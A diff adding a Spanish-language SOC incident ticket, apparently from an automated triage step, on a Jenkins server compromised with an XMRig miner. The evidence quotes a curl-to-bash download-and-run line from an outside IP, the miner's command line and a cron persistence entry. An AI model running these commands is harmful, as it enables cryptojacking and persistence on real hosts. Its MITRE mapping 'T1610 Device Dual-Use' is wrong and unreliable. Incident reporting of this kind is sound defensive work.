@@ -1,0 +1,147 @@
+{
+  "ticket_id": "TKT-20261006-C2-001",
+  "alert_ids": [
+    "ALR-20261006-011826"
+  ],
+  "title": "Compromiso confirmado de JENKINS-DEV01: RCE → criptómino XMRig (C2 a pool Monero) → persistencia cron",
+  "verdict": "true_positive",
+  "confidence": 0.95,
+  "severity": "critical",
+  "severity_rationale": "Regla UC-NET-002 (C2 a indicador TI) = high. Activo más crítico afectado = JENKINS-DEV01 (criticalidad Media). Cruce de matriz high × Media = high. Ajuste +1 (único permitido) por EJECUCIÓN CONFIRMADA de código malicioso: pipeline curl|bash ejecutado, criptómino corriendo al 92% de CPU y persistencia cron instalada (no es solo intento). Resultado: high + 1 = critical. No aplica ajuste -1 porque no hubo bloqueo previo del efecto (el firewall permitió el C2 y el proceso continuó).",
+  "affected": {
+    "users": [
+      "jenkins (cuenta de servicio CI/CD)"
+    ],
+    "hosts": [
+      "JENKINS-DEV01 (10.60.1.10)"
+    ],
+    "business_services": [
+      "Integración continua"
+    ],
+    "customers": [
+      "No confirmados"
+    ]
+  },
+  "summary": "JENKINS-DEV01 (servidor CI/CD, zona DEV, criticalidad Media) realizó una conexión saliente permitida hacia 141.94.96.144:3333 (pool de minería Monero / XMRig, reputación malicious en TIP, confianza 70). EDR confirma la cadena de ataque completa: (1) RCE mediante 'curl -s http://141.94.96.144/x.sh | bash' lanzado por el proceso java de Jenkins; (2) ejecución del criptómino en /tmp/.x/kswapd0 (suplantando el nombre de un hilo kernel de Linux) conectado a pool.supportxmr.com:3333 con monedero Monero 4AdUnd... al 92% de CPU; (3) persistencia vía crontab '*/5 * * * * /tmp/.x/kswapd0'. No existe cambio aprobado ni actividad autorizada asociada. La detección de la regla es correcta y la actividad es maliciosa confirmada.",
+  "evidence": [
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123423",
+      "finding": "Ejecución de código remoto (RCE). 2026-10-06T01:14:00Z. 'sh -c curl -s http://141.94.96.144/x.sh | bash' en JENKINS-DEV01, usuario 'jenkins', proceso padre 'java' (pid 31201, parent_pid 1022). Descarga y ejecución de script desde el IP malicioso vía pipeline."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123424",
+      "finding": "Ejecución de criptómino. 2026-10-06T01:15:00Z. /tmp/.x/kswapd0 -o pool.supportxmr.com:3333 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge -p x --cpu-max-threads-hint=90 -B (padre 'bash', pid 31244), CPU media 92%. Nombre supuesto a hilo kernel Linux. sha256 561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123425",
+      "finding": "Persistencia. 2026-10-06T01:15:20Z. registro crontab con '*/5 * * * * /tmp/.x/kswapd0 >/dev/null 2>&1' (borrado de 5 en 5 minutos)."
+    },
+    {
+      "source": "firewall",
+      "event_id": "FW-0025323",
+      "finding": "C2 confirmado y permitido. 2026-10-06T01:16:00Z. 10.60.1.10 (JENKINS-DEV01) → 141.94.96.144:3333, regla DEV-OUTBOUND-ANY, action ALLOW, 58000 bytes, zona DEV → EXTERNAL."
+    },
+    {
+      "source": "inteligencia_TIP",
+      "event_id": "N/A",
+      "finding": "141.94.96.144: reputation malicious, familia XMRig, tag miner, confianza 70, first_seen 2026-09-20 (OVH SAS, Estrasburgo, hosting). pool.supportxmr.com: reputation malicious, XMRig, miner, confianza 70. Hash 561c0d42...: SIN coincidencia en el TIP → DESCONOCIDO (no se puede corroborar reputación)."
+    },
+    {
+      "source": "cmdb_activo",
+      "event_id": "A01174",
+      "finding": "JENKINS-DEV01: servidor CI/CD, Ubuntu 20.04 / Jenkins 2.426.2, criticalidad Media, zona DEV, internet-facing por error. Vulnerabilidad abierta CVE-2024-23897 (Jenkins, CVSS 9.8, lectura arbitraria de ficheros → RCE), detectada 2026-02-14, parche pospuesto por dependencia de plugins. Vector de acceso inicial probable."
+    },
+    {
+      "source": "firewall_correlacion",
+      "event_id": "FW-0000175,0000524,0001828,0001855,0001367,0001764 (y entrantes)",
+      "finding": "Alrededor del incidente, JENKINS-DEV01 contactó hosts internos de LOGISTICS-IT (10.40.1.x) en 445 (SMB), 1433 (MSSQL), 22 (SSH), 135 (RPC), 8080, 443; y hosts internos le respondieron. Patrón a revisar como posible movimiento lateral / exfiltración. Sin distinción entre rutina CI/CD legítima y actividad maliciosa."
+    },
+    {
+      "source": "consultas_corroborantes",
+      "event_id": "N/A",
+      "finding": "consultar_cambios para 'JENKINS-DEV01' y 'Jenkins': sin cambios aprobados, pentests ni actividades autorizadas. consultar_usuario 'jenkins': no es usuario de directorio → cuenta de servicio. La actividad NO está autorizada."
+    }
+  ],
+  "enrichment": [
+    {
+      "indicator": "141.94.96.144",
+      "type": "ip",
+      "source": "TIP",
+      "result": "malicious, XMRig, miner, confianza 70"
+    },
+    {
+      "indicator": "pool.supportxmr.com",
+      "type": "domain",
+      "source": "TIP",
+      "result": "malicious, XMRig, miner, confianza 70"
+    },
+    {
+      "indicator": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83",
+      "type": "hash",
+      "source": "TIP",
+      "result": "sin_match → DESCONOCIDO"
+    }
+  ],
+  "mitre": [
+    "T1071 Application Layer Protocol (C2), T1059.004 Command/Script Unix (curl|bash), T1496 Cryptomining, T1053.003 Cron persistence, T1610 Device Dual-Use (suplantación de nombre de hilo kernel)"
+  ],
+  "recommended_actions": [
+    {
+      "action": "Escalar a N2 de inmediato por teléfono (SLA critical 15 min), notificando a Responsable SOC y CISO",
+      "target": "N2",
+      "requires_approval": false,
+      "justification": "Escalado obligatorio: true_positive critical + ejecución confirmada de código malicioso + persistencia instalada."
+    },
+    {
+      "action": "Bloquear IOCs en proxy y EDR (el N1 puede ejecutar): 141.94.96.144, pool.supportxmr.com, hash 561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83",
+      "target": "proxy/EDR",
+      "requires_approval": false,
+      "justification": "Acción de contención no disruptiva; el IOC de minería es malicioso confirmado."
+    },
+    {
+      "action": "Aislar redamentalmente JENKINS-DEV01 de la red interna (evitar exfiltración y movimiento lateral)",
+      "target": "JENKINS-DEV01",
+      "requires_approval": true,
+      "justification": "Requiere aprobación N2 + dueño del servicio. Es un servidor, no una acción N1 automática."
+    },
+    {
+      "action": "Revocar sesiones y forzar rotación de credenciales de la cuenta de servicio 'jenkins', y auditar tokens/llaves de build de Jenkins",
+      "target": "cuenta jenkins / CI-CD",
+      "requires_approval": true,
+      "justification": "Requiere aprobación N2; la cuenta de servicio puede afectar un proceso de negocio."
+    },
+    {
+      "action": "Investigar el vector de acceso inicial: cómo el proceso java (Jenkins) originó el pipeline curl|bash; revisar logs de Jenkins y aplicar/mitigar CVE-2024-23897 (CVSS 9.8) que quedó abierto",
+      "target": "JENKINS-DEV01 / CVE-2024-23897",
+      "requires_approval": false,
+      "justification": "Raíz del compromiso."
+    },
+    {
+      "action": "Eliminar persistencia y criptómino en el servidor aislado (borrar crontab y /tmp/.x/kswapd0; limpiar /tmp/.x). Proponer; no ejecutar sin aprobación N2",
+      "target": "JENKINS-DEV01",
+      "requires_approval": true,
+      "justification": "Contención correctiva sobre el activo comprometido."
+    },
+    {
+      "action": "Revisar como N2 los eventos de firewall FW-0000175/524/1828/1855/1367/1764 y los entrantes a JENKINS-DEV01 para determinar si hay movimiento lateral o exfiltración real hacia LOGISTICS-IT (10.40.1.x)",
+      "target": "LOGISTICS-IT / pivoteo lateral",
+      "requires_approval": false,
+      "justification": "Correlación RB-09; puede ampliar el alcance del incidente (datos personales / DPO)."
+    }
+  ],
+  "escalation": {
+    "escalate": true,
+    "to": "N2 de guardia",
+    "reason": "true_positive de severidad critical; ejecución confirmada de código malicioso (RCE criptómino) y persistencia (cron). Escalado a N2 en la misma jornada por SLA de 15 min; notificar a Responsable SOC y CISO; posible ampliación a DPO si se confirma salida de datos de clientes/empleados."
+  },
+  "open_questions": [
+    "¿Cómo entró el pipeline en el proceso Jenkins (CVE-2024-23897 expuesto a Internet)?",
+    "¿Hubo exfiltración de datos o acceso a bases de datos MSSQL (puerto 1433) en LOGISTICS-IT? ¿Hay datos personales implicados?",
+    "El hash del criptómino está en el TIP como DESCONOCIDO; no se puede correlacionar con familias conocidas."
+  ],
+  "executed_actions": [],
+  "triage_seconds": 150.58
+}
